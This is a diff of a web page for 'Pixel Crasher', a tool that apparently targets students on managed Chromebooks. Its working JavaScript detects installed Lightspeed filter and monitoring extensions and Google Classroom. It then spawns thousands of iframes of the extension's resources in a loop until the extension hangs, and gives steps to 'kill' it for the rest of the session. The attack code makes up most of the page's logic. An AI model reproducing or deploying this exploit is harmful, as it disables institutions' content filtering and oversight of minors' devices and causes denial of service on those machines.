@@ -1,29 +1,116 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
-    <script src="https://cdn.jsdelivr.net/gh/pixel-nebula/pixel-nebula.github.io@master/particles.js"></script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PixelNebula</title>
-    <link rel="icon" href="https://cdn.jsdelivr.net/gh/pixel-nebula/pixel-nebula.github.io@master/Pictures/Logo.png" type="image/png"> <!-- Favicon added -->
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            background-color: black;
-            background-size: cover;
-            background-position: center;
-            font-family: Arial, sans-serif;
-            color: white;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-start;
-            align-items: center;
-        }
-        .header {
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
+  <script src="https://cdn.jsdelivr.net/gh/pixel-nebula/pixel-nebula.github.io@master/particles.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PixelNebula</title>
+  <link rel="icon" href="https://cdn.jsdelivr.net/gh/pixel-nebula/pixel-nebula.github.io@master/Pictures/Logo.png" type="image/png">
+<style>
+body {
+  font-family: 'Varela Round', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #000000;
+}
+.logo {
+  width: 50px;
+  height: 50px;
+  margin-right: 10px;
+}
+.container {
+  max-width: 800px;
+  margin: 150px auto 0 auto;
+  padding: 20px;
+  text-align: center;
+  background: transparent;
+  color: white;
+  border: 5px solid white;
+  border-radius: 25px;
+}
+select {
+  font-family: 'Varela Round', sans-serif;
+  color: #fff;
+  background-color: #ffff;
+  margin-bottom: 10px;
+  padding: 10px;
+  font-size: 16px;
+  border: 5px solid white;
+  border-radius: 10px;
+  width: 100%;
+}
+button {
+  font-family: 'Varela Round', sans-serif;
+  background-color: #000000;
+  color: #fff;
+  padding: 10px 20px;
+  font-size: 16px;
+  cursor: pointer;
+  margin-top: 10px;
+  transition: background-color 0.3s ease;
+  border: 5px solid white;
+  border-radius: 10px;
+}
+button:hover {
+  background-color: #3C3C3C;
+}
+.overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  color: #fff;
+  font-size: 24px;
+  user-select: none;
+  flex-direction: column;
+}
+.spinner {
+  border: 6px solid rgba(255, 255, 255, 0.3);
+  border-top: 6px solid #fff;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+  margin-bottom: 20px;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+#killExtensionText {
+  display: none;
+  margin-top: 20px;
+  color: #333;
+  font-size: 18px;
+  text-align: center;
+  background: #e9ecef;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+}
+#killButton {
+  display: none;
+  background-color: #dc3545;
+  color: #fff;
+  border: none;
+  padding: 10px 20px;
+  font-size: 16px;
+  cursor: pointer;
+  border-radius: 5px;
+  transition: background-color 0.3s ease;
+}
+#killButton:hover {
+  background-color: #9c1c28;
+}
+.header {
             margin-top: 20px;
             text-align: center;
         }
@@ -35,6 +122,89 @@
             font-size: 40px;
             margin: 0;
         }
+        .menu {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            gap: 20px; /* Adjust the spacing betwe menu items */
+        }
+        .menu a {
+            text-decoration: none;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 5px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        .menu a:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        .menu a.Games {
+            text-decoration: underline;
+        }
+        .logout {
+            position: absolute;
+            top: 20px; /* Top right of the window */
+            right: 20px;
+            padding: 10px;
+            text-decoration: none;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+
+        .logout:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        .profile {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .profile img {
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            transition: transform 0.3s ease;
+        }
+
+        .profile:hover img {
+            transform: scale(1.1);
+        }
+
+        .dropdown {
+            display: none;
+            position: absolute;
+            top: 60px; /* Positioning the dropdown below the profile image */
+            right: 0;
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 10px;
+            border-radius: 5px;
+            z-index: 10;
+        }
+
+        .dropdown a {
+            display: block;
+            text-decoration: none;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+
+        .dropdown a:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
         #particles-js {
             position: fixed;
             top: 0;
@@ -43,7 +213,42 @@
             height: 100vh;
             z-index: 0; /* Send it behind all other elements */
         }
-        :root {
+        .message-box {
+  position: fixed;
+  bottom: 10px;
+  right: 10px;
+  background-color: rgba(0, 0, 0, 0.3); /* Half-transparent black */
+  color: white;
+  padding: 15px;
+  font-size: 14px;
+  border-radius: 8px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+  width: auto;
+  max-width: 300px;
+}
+
+.message-box a {
+  color: #00b0ff;
+  text-decoration: none;
+}
+
+.message-box a:hover {
+  text-decoration: underline;
+}
+.close-btn {
+  position: absolute;
+  top: 5px;
+  left: 5px;
+  cursor: pointer;
+  font-size: 20px;
+  font-weight: bold;
+  color: #fff;
+}
+
+.close-btn:hover {
+  color: red;
+}
+:root {
         --clr1: #00ff00; /* Green color for text */
     }
 
@@ -103,48 +308,9 @@
     z-index: 0;  /* Ensure it's on top of other elements */
     pointer-events: auto;  /* Allow click-through */
         }
-        .search-bar {
-            margin-top: 100px;
-            text-align: center;
-            width: 100%;
-            z-index: 5;
-        }
-        .search-bar input {
-            width: 80%;
-            max-width: 600px;
-            padding: 10px;
-            font-size: 16px;
-            border: 2px solid white;
-            border-radius: 5px;
-            background-color: rgba(0, 0, 0, 0.6);
-            color: white;
-            z-index: 5;
-        }
-        .search-bar input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
-        }
-        .Crash-button {
-            display: inline-block;
-            text-decoration: none;
-            color: white;
-            background-color: rgba(0, 0, 0, 0.7);
-            font-size: 16px;
-            font-weight: bold;
-            padding: 10px 40px;
-            border-radius: 5px;
-            transition: background-color 0.3s;
-            border: 2px solid white; /* Border for play button */
-            margin-top: 50px;
-            z-index: 100;
-        }
-        .Crash-button:hover {
-            background-color: rgba(255, 255, 255, 0.2);
-            cursor: pointer;
-        }
-    </style>
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6845450223326411"crossorigin="anonymous"></script>
+</style>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6845450223326411"crossorigin="anonymous"></script>
 </head>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-C130NKT3ZP"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -152,191 +318,458 @@
 
   gtag('config', 'G-C130NKT3ZP');
 </script>
-<body onload="">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-C130NKT3ZP"></script>
+<body onload="checkLoginStatus()">
   <div style="visibility: hidden;" id="particles-js"></div>
-  <div style="visibility: hidden;" id="drops"></div>
-  <canvas style="visibility: hidden;"  id="LaserCanvas"></canvas>
-  <canvas style="visibility: hidden;" id="dotCanvas"></canvas>
-    <div class="header">
-        <h2>PixelCrasher</h2>
-        <h3>Pixel Crashers is designed to target and crash specific extentions for a short period of time. </h3>
+    <div style="visibility: hidden;" id="drops"></div>
+    <canvas style="visibility: hidden;"  id="LaserCanvas"></canvas>
+    <canvas style="visibility: hidden;" id="dotCanvas"></canvas>
+    <!-- Menu -->
+    <div class="menu">
+        <a href="Home.html">Home</a>
+        <a href="Games.html">Games</a>
+        <a href="Apps.html">Apps</a>
     </div>
+    
+    <div class="profile" onclick="toggleDropdown()">
+        <img id="profile-pic" src="https://cdn.jsdelivr.net/gh/pixel-nebula/pixel-nebula.github.io@master/Pictures/profilepic.jpg" alt="Profile">
+        <div class="dropdown" id="dropdown-menu">
+            <a href="Settings.html">Settings</a>
+            <a href="#" onclick="logout()">Logout</a>
+        </div>
+    </div>
+<div class="container">
+  <p>Welcome to Pixel Crasher! lag after you finish shattering is normal.</p>
 
-    <div class="search-bar">
-      <input type="text" id="searchInput" placeholder="Search with Extention ID...">
-  </div>
-  <a class="Crash-button"  onclick="crashExtension()">Crash</a>
-
-  <h3 style="margin-top: 70px;max-width: 500px;">
-    Description:
-  </h3>
-  <h3 style="margin-top: 5px; max-width: 500px;">
-    Pixel Crasher is a tool that takes an extension ID and crashes it, preventing it from functioning properly. As long as the Pixel Crasher page remains open, the affected extension will stay disabled, keeping your tabs unblocked. It may take a few minutes for the effect to kick in, so be patient while it works.
-  </h3>
+  <label for="iframeSelect" id="labelForIframeSelect"></label>
+  <select style="background-color: #000000; color: #fff;" id="iframeSelect"></select>
   
-    <script src="Laser.js"></script>
-</body>
-</html>
+  
+  <label for="iframeCountSlider" id="labelForIframeSlider" style="margin-top: 20px;">The slider below changes the crashing value. The time unblocking goes up but it might cause more lag.</label>
+
+  <div style="display: flex; align-items: center; gap: 10px; margin: 10px 0;">
+    <input type="range" id="iframeCountSlider" min="100" max="15000" value="2000" step="100" style="flex-grow: 1;">
+    <span id="iframeCountValue">3000</span>
+  </div>
+
+  <button onclick="warning();" id="hangButton">Shatter Extension!</button>
+  <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
+</div>
+
+<div class="overlay" id="overlay"><div class="spinner"></div> Shattering... (This will take a few minutes)</div>
+
+<div id="killExtensionText"></div>
 
 <script>
-  document.addEventListener('DOMContentLoaded', function () {
-    let cookieName = 'backgroundtype';
-  let cookieValue = getCookie(cookieName);
+document.addEventListener("DOMContentLoaded", function() {
+  const slider = document.getElementById("iframeCountSlider");
+  const sliderValueDisplay = document.getElementById("iframeCountValue");
+  const deviceMemory = navigator.deviceMemory || 8;
+  const defaultIframeCount = Math.round(deviceMemory * 500);
+  const maxIframeCount = Math.round(deviceMemory * 10000);
+  slider.value = defaultIframeCount;
+  slider.max = maxIframeCount;
+  sliderValueDisplay.textContent = defaultIframeCount;
+  
+  slider.addEventListener("input", function() {
+    sliderValueDisplay.textContent = this.value;
+  });
+});
 
-  // If cookie value exists, apply the visibility based on the value
-  if (cookieValue === '1') {
-    document.getElementById('particles-js').style.visibility = 'visible';
-  } else if (cookieValue === '2') {
-    document.getElementById('drops').style.visibility = 'visible';
-  } else if (cookieValue === '3') {
-    document.getElementById('LaserCanvas').style.visibility = 'visible';
-  } else if (cookieValue === '4') {
-    document.getElementById('dotCanvas').style.visibility = 'visible';
-  } else {
-    // If no cookie exists, set the cookie to '1' and set the default visibility
-    setCookie(cookieName, '1', 100);  // Set the default cookie value
-    document.getElementById('particles-js').style.visibility = 'visible';
+document.getElementById("iframeCountSlider").addEventListener("input", function() {
+  const iframeCountValue = document.getElementById("iframeCountValue");
+  iframeCountValue.textContent = this.value;
+});
+
+async function checkExtensionURL(url) {
+  try {
+    const response = await fetch(url);
+    return response.ok;
+  } catch (error) {
+    return false;
   }
-  })
-          
+}
 
-    particlesJS('particles-js', {
-        "particles": {
+async function populateSelectOptions() {
+  const selectElement = document.getElementById("iframeSelect");
+  const extensions = {
+    "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+    "Lightspeed Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
+    "Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png"
+  };
+
+  let hasSupportedExtensions = false;
+  for (const [name, url] of Object.entries(extensions)) {
+    if (await checkExtensionURL(url)) {
+      const option = document.createElement("option");
+      option.value = url;
+      option.textContent = name;
+      selectElement.appendChild(option);
+      hasSupportedExtensions = true;
+    }
+  }
+  if (!hasSupportedExtensions) {
+    const option = document.createElement("option");
+    option.value = "";
+    option.textContent = "No supported extensions installed";
+    selectElement.appendChild(option);
+    document.getElementById("hangButton").style.display = "none";
+    document.getElementById("iframeCountSlider").style.display = "none";
+    try { document.getElementById("labelForIframeSlider").style.display = "none"; } catch (err) {}
+    document.getElementById("iframeCountValue").style.display = "none";
+  }
+}
+populateSelectOptions();
+
+function replaceIframes(container, iframeSrc, iframeCount) {
+  for (let i = 0; i < iframeCount; i++) {
+    const iframe = document.createElement('iframe');
+    iframe.src = iframeSrc;
+    iframe.style.width = '100%';
+    iframe.style.height = '100px';
+    container.appendChild(iframe);
+  }
+  setTimeout(function() {
+    while (container.firstChild) {
+      container.removeChild(container.firstChild);
+    }
+    replaceIframes(container, iframeSrc, iframeCount);
+  }, 5);
+}
+
+function warning() {
+  const overlay = document.getElementById("overlay");
+  overlay.style.display = "flex";
+  const ContainerGeneral = document.getElementById("container")
+  ContainerGeneral.style.display = "none";
+  const iframeSelect = document.getElementById("iframeSelect");
+  const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
+  const selectedSrc = iframeSelect.value;
+  const iframeCount = parseInt(document.getElementById("iframeCountSlider").value, 10);
+  const popup = window.open("", "PopupWindow", "width=100,height=100");
+  const popupDocument = popup.document;
+  const popupBody = popupDocument.body;
+  const iframeContainer = popupDocument.createElement('div');
+  iframeContainer.id = 'iframeContainer';
+  popupBody.appendChild(iframeContainer);
+  replaceIframes(iframeContainer, selectedSrc, iframeCount);
+
+  setTimeout(function() {
+    popup.close();
+    const ContainerGeneral = document.getElementById("container")
+    ContainerGeneral.style.display = "flex";
+    const killExtensionText = document.getElementById("killExtensionText");
+    killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been Crashed, press the button above.";
+    setTimeout(function() {
+      overlay.style.display = "none";
+      killExtensionText.style.display = "block";
+      document.getElementById("killButton").style.display = "inline-block";
+      document.getElementById("hangButton").style.display = "none";
+      document.getElementById("iframeSelect").style.display = "none";
+      try { document.getElementById("labelForIframeSelect").style.display = "none"; } catch (err) {}
+      document.getElementById("iframeCountSlider").style.display = "none";
+      document.getElementById("iframeCountValue").style.display = "none";
+      document.getElementById("killButton").setAttribute("data-url", selectedSrc);
+    }, 10000);
+  }, 5000);
+}
+
+function openExtensionPopup() {
+  const selectedSrc = document.getElementById("killButton").getAttribute("data-url");
+  const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+  const killExtensionText = document.getElementById("killExtensionText");
+  document.getElementById("killButton").style.display = "none";
+  killExtensionText.innerHTML = "Make sure to keep this tab open. Then open <strong>chrome://extensions/?id=" + extensionId + "</strong> and flip the switch called 'Allow access to file URLs' twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, restart your computer.";
+  window.location.href = selectedSrc;
+}
+</script>
+</body>
+</html>
+<script>
+  function isGoogleIDToken(token) {const jwtPattern = /^[a-zA-Z0-9\-_]+\.([a-zA-Z0-9\-_]+)\.[a-zA-Z0-9\-_]+$/; return jwtPattern.test(token);}
+
+    function checkLoginStatus() {
+        if (!navigator.onLine) {
+
+          const idToken = getCookie('IDToken'); 
+        if (!idToken || !isGoogleIDToken(idToken)) {window.location.href = 'index.html';}
+
+        let cookieName = 'backgroundtype';
+let cookieValue = getCookie(cookieName);
+
+// If cookie value exists, apply the visibility based on the value
+if (cookieValue === '1') {
+document.getElementById('particles-js').style.visibility = 'visible';
+} else if (cookieValue === '2') {
+document.getElementById('drops').style.visibility = 'visible';
+} else if (cookieValue === '3') {
+document.getElementById('LaserCanvas').style.visibility = 'visible';
+} else if (cookieValue === '4') {
+document.getElementById('dotCanvas').style.visibility = 'visible';
+} else {
+// If no cookie exists, set the cookie to '1' and set the default visibility
+setCookie(cookieName, '1', 100);  // Set the default cookie value
+document.getElementById('particles-js').style.visibility = 'visible';
+}
+        document.body.style.visibility = "visible";
+        document.getElementById('profile-pic').src = 'https://cdn.jsdelivr.net/gh/pixel-nebula/pixel-nebula.github.io@master/Pictures/profilepic.jpg';
+        document.getElementById("messageBox").style.display = "none";
+        const gameItems = document.querySelectorAll('.game-item');
+
+    gameItems.forEach(item => {
+        // Update the play button
+        const playButton = item.querySelector('.play-button');
+        playButton.href = "#";
+        playButton.textContent = "Unavailable";
+
+        // Update the status message
+        const statusMessage = item.querySelector('.text-container p small');
+        if (statusMessage) {
+            statusMessage.textContent = "Offline";
+        }
+    });
+        }
+        else if (navigator.onLine) {
+          let cookieName = 'backgroundtype';
+let cookieValue = getCookie(cookieName);
+
+// If cookie value exists, apply the visibility based on the value
+if (cookieValue === '1') {
+document.getElementById('particles-js').style.visibility = 'visible';
+} else if (cookieValue === '2') {
+document.getElementById('drops').style.visibility = 'visible';
+} else if (cookieValue === '3') {
+document.getElementById('LaserCanvas').style.visibility = 'visible';
+} else if (cookieValue === '4') {
+document.getElementById('dotCanvas').style.visibility = 'visible';
+} else {
+// If no cookie exists, set the cookie to '1' and set the default visibility
+setCookie(cookieName, '1', 100);  // Set the default cookie value
+document.getElementById('particles-js').style.visibility = 'visible';
+}
+const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+    const [key, value] = cookie.split('=').map(c => c.trim());
+    acc[key] = value;
+    return acc;
+}, {});
+
+const idToken = cookies.IDToken;
+
+if (idToken) {
+    if (sessionStorage.getItem('profile-pic')) {
+        // Use cached profile pic if available
+        document.getElementById('profile-pic').src = sessionStorage.getItem('profile-pic');
+        document.body.style.visibility = "visible";
+    } else {
+        // Fetch profile info from API
+        fetch(`https://www.googleapis.com/oauth2/v3/tokeninfo?id_token=${idToken}`)
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('profile-pic').src = data.picture;
+                // Cache profile picture in sessionStorage
+                sessionStorage.setItem('profile-pic', data.picture);
+                document.body.style.visibility = "visible";
+            })
+            .catch(error => {
+                console.error('Error validating token:', error);
+                document.cookie = "IDToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
+                window.location.href = 'index.html';
+            });
+    }
+} else {
+    window.location.href = 'index.html';
+}
+
+if (getCookie("messageBoxClosed") === "true") {document.getElementById("messageBox").style.display = "none";}
+document.getElementById('profile-pic').onerror = function() {
+    this.src = 'https://cdn.jsdelivr.net/gh/pixel-nebula/pixel-nebula.github.io@master/Pictures/profilepic.jpg';  // Path to your default profile picture
+};
+}
+
+    function logout() {
+        document.cookie = "IDToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
+        window.location.href = 'index.html';
+    }
+
+    document.getElementById('searchInput').addEventListener('input', function() {
+        let filter = this.value.toLowerCase();
+        let gameItems = document.querySelectorAll('.game-item');
+        
+        gameItems.forEach(function(item) {
+            let gameTitle = item.querySelector('h3').textContent.toLowerCase();
+            if (gameTitle.includes(filter)) {
+                item.style.display = '';
+            } else {
+                item.style.display = 'none';
+            }
+        });
+    });
+    }
+</script>
+<script src="Laser.js"></script>
+<script>
+  particlesJS('particles-js', {
+      "particles": {
 "number": {
-  "value": 200,
-  "density": {
-    "enable": true,
-    "value_area": 800
-  }
+"value": 200,
+"density": {
+  "enable": true,
+  "value_area": 800
+}
 },
 "color": {
-  "value": "#ffffff"
+"value": "#ffffff"
 },
 "shape": {
-  "type": "", // Circle //
-  "stroke": {
-    "width": 0,
-    "color": "#000000"
-  },
-  "polygon": {
-    "nb_sides": 5
-  },
-  "image": {
-    "src": "img/github.svg",
-    "width": 100,
-    "height": 100
-  }
+"type": "", // Circle //
+"stroke": {
+  "width": 0,
+  "color": "#000000"
+},
+"polygon": {
+  "nb_sides": 5
+},
+"image": {
+  "src": "img/github.svg",
+  "width": 100,
+  "height": 100
+}
 },
 "opacity": {
-  "value": 1,
-  "random": true,
-  "anim": {
-    "enable": true,
-    "speed": 1,
-    "opacity_min": 0,
-    "sync": false
-  }
+"value": 1,
+"random": true,
+"anim": {
+  "enable": true,
+  "speed": 1,
+  "opacity_min": 0,
+  "sync": false
+}
 },
 "size": {
-  "value": 3,
-  "random": true,
-  "anim": {
-    "enable": false,
-    "speed": 4,
-    "size_min": 0.3,
-    "sync": false
-  }
+"value": 3,
+"random": true,
+"anim": {
+  "enable": false,
+  "speed": 4,
+  "size_min": 0.3,
+  "sync": false
+}
 },
 "line_linked": {
-  "enable": true,
-  "distance": 90,
-  "color": "#ffffff",
-  "opacity": 0.4,
-  "width": 1
+"enable": true,
+"distance": 90,
+"color": "#ffffff",
+"opacity": 0.4,
+"width": 1
 },
 "move": {
-  "enable": true,
-  "speed": 2,
-  "direction": "none",
-  "random": true,
-  "straight": false,
-  "out_mode": "out",
-  "bounce": false,
-  "attract": {
-    "enable": false,
-    "rotateX": 600,
-    "rotateY": 600
-  }
+"enable": true,
+"speed": 2,
+"direction": "none",
+"random": true,
+"straight": false,
+"out_mode": "out",
+"bounce": false,
+"attract": {
+  "enable": false,
+  "rotateX": 600,
+  "rotateY": 600
+}
 }
 },
 "interactivity": {
 "detect_on": "canvas",
 "events": {
-  "onhover": {
-    "enable": true,
-    "mode": "repulse"
-  },
-  "onclick": {
-    "enable": false,
-    "mode": "repulse"
-  },
-  "resize": true
+"onhover": {
+  "enable": true,
+  "mode": "repulse"
+},
+"onclick": {
+  "enable": false,
+  "mode": "repulse"
+},
+"resize": true
 },
 "modes": {
-  "grab": {
-    "distance": 400,
-    "line_linked": {
-      "opacity": 1
-    }
-  },
-  "bubble": {
-    "distance": 100,
-    "size": 4,
-    "duration": 2,
-    "opacity": 0,
-    "speed": 3
-  },
-  "repulse": {
-    "distance": 50,
-    "duration": 0.4
-  },
-  "push": {
-    "particles_nb": 4
-  },
-  "remove": {
-    "particles_nb": 2
+"grab": {
+  "distance": 400,
+  "line_linked": {
+    "opacity": 1
   }
+},
+"bubble": {
+  "distance": 100,
+  "size": 4,
+  "duration": 2,
+  "opacity": 0,
+  "speed": 3
+},
+"repulse": {
+  "distance": 50,
+  "duration": 0.4
+},
+"push": {
+  "particles_nb": 4
+},
+"remove": {
+  "particles_nb": 2
+}
 }
 },
 "retina_detect": true
-    });
+  });
 </script>
 
+<script>
+  function closeMessageBox() {
+  document.getElementById("messageBox").style.display = "none";
+  setCookie("messageBoxClosed", "true", 5); // Cookie expires in 30 days
+}
+
+
+function setCookie(name, value, days) {
+  const date = new Date();
+  date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+  const expires = "expires=" + date.toUTCString();
+  document.cookie = name + "=" + value + ";" + expires + ";path=/";
+}
+
+// Function to get a cookie by its name.
+function getCookie(name) {
+  const nameEq = name + "=";
+  const ca = document.cookie.split(';');
+  for (let i = 0; i < ca.length; i++) {
+    let c = ca[i].trim();
+    if (c.indexOf(nameEq) == 0) return c.substring(nameEq.length, c.length);
+  }
+  return "";
+}
+</script>
 
 <script>
   function getCookie(name) {
-            // Split document.cookie into individual cookies
-            let decodedCookie = decodeURIComponent(document.cookie);
-            let cookies = decodedCookie.split(';');
-            for (let i = 0; i < cookies.length; i++) {
-                let cookie = cookies[i].trim();
-                // Check if the cookie starts with the name we're looking for
-                if (cookie.startsWith(name + '=')) {
-                    return cookie.substring(name.length + 1); // Return the value of the cookie
-                }
-            }
-            return ''; // Return empty string if cookie is not found
-        }
+          // Split document.cookie into individual cookies
+          let decodedCookie = decodeURIComponent(document.cookie);
+          let cookies = decodedCookie.split(';');
+          for (let i = 0; i < cookies.length; i++) {
+              let cookie = cookies[i].trim();
+              // Check if the cookie starts with the name we're looking for
+              if (cookie.startsWith(name + '=')) {
+                  return cookie.substring(name.length + 1); // Return the value of the cookie
+              }
+          }
+          return ''; // Return empty string if cookie is not found
+      }
 
-        function setCookie(name, value, days) {
-            let expires = '';
-            if (days) {
-                let date = new Date();
-                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // Set expiration time
-                expires = "; expires=" + date.toUTCString();
-            }
-            document.cookie = name + "=" + value + expires + "; path=/"; // Set the cookie
-        }
+      function setCookie(name, value, days) {
+          let expires = '';
+          if (days) {
+              let date = new Date();
+              date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // Set expiration time
+              expires = "; expires=" + date.toUTCString();
+          }
+          document.cookie = name + "=" + value + expires + "; path=/"; // Set the cookie
+      }
 
   const colors = ['#00ff00']; // Green color for all letters
   let colorIndex = 0;
@@ -384,6 +817,27 @@
   }
 
   setInterval(generateSourceDrop, 60); // Adjusted interval to spawn fewer drops
+</script>
+<script>
+  function toggleDropdown() {
+  const dropdown = document.getElementById('dropdown-menu');
+  dropdown.style.display = (dropdown.style.display === 'block') ? 'none' : 'block';
+}
+
+        function logout() {
+            document.cookie = "IDToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
+            window.location.href = 'index.html';
+        }
+
+        // Close dropdown if clicking outside the profile
+        window.onclick = function(event) {
+            if (!event.target.matches('.profile img')) {
+                const dropdown = document.getElementById('dropdown-menu');
+                if (dropdown.style.display === 'block') {
+                    dropdown.style.display = 'none';
+                }
+            }
+          }
 </script>
 <script>
   const canvasDot2 = document.getElementById('dotCanvas');
@@ -536,53 +990,4 @@ window.addEventListener('resize', () => {
     dots2 = createDotsForWord2(word2);
 });
 
-</script>
-
-<script>
-  function checkLoginStatus() {
-const cookies = document.cookie.split(';').reduce((acc, cookie) => {
-const [key, value] = cookie.split('=').map(c => c.trim());
-acc[key] = value;
-return acc;
-}, {});
-
-const idToken = cookies.IDToken;
-
-if (idToken) {
-fetch(`https://www.googleapis.com/oauth2/v3/tokeninfo?id_token=${idToken}`)
-.then(response => response.json())
-.then(data => {})
-.catch(error => {
-  console.error('Error validating token:', error);
-  // Clear the cookie and redirect to index.html if token validation fails
-  document.cookie = "IDToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
-  window.location.href = 'index.html';
-});
-} else {
-// Redirect to index.html if no ID Token is found
-window.location.href = 'index.html';
-}
-}
-</script>
-<script>var _0x4e94 = ["aHR0cHM6Ly9waXhlbC1uZWJ1bGEuczMuYW1hem9uYXdzLmNvbQ=="];var _0x872834 = atob(_0x4e94[0]);if (window[_0x4e94[0]] !==  _0x872834) {window.close();}</script>
-
-<script>
-function crashExtension() {
-    const extensionID = document.getElementById("searchInput").value.trim();
-    if (!extensionID) {
-        alert("Please enter a valid Extension ID.");
-        return;
-    }
-
-    const url = `chrome-extension://${extensionID}/Main.js`;
-
-    for (let i = 0; i < 20000; i++) {
-        let iframe = document.createElement("iframe");
-        iframe.style.display = "none"; // Makes the iframes invisible
-        iframe.src = url;
-        document.body.appendChild(iframe);
-    }
-
-    alert("Crashing in progress... Keep this page open.");
-}
 </script>
